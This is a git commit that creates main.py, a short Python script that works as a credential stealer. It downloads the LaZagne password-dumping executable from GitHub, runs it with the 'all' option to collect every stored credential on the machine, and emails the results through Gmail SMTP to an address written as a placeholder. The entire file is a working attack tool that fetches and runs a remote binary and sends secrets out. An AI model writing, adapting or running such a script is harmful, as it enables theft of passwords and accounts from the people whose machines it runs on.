9d3fb218ba6898ccd4b9d257c0bd696cbeb2c5c3
Daniil Nababkin <43863412+TheRavehorn@users.noreply.github.com>
2020-09-05 18:05:58 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python3
+import requests
+import subprocess
+import smtplib
+import re
+
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as f:
+        f.write(get_response.content)
+
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP_SSL("smtp.gmail.com", "465")
+    server.ehlo()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+
+download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")  # LaZagne
+
+result = subprocess.check_output("lazagne.exe all", shell=True)
+send_mail("youremail@gmail.com", "yourpassword", result)
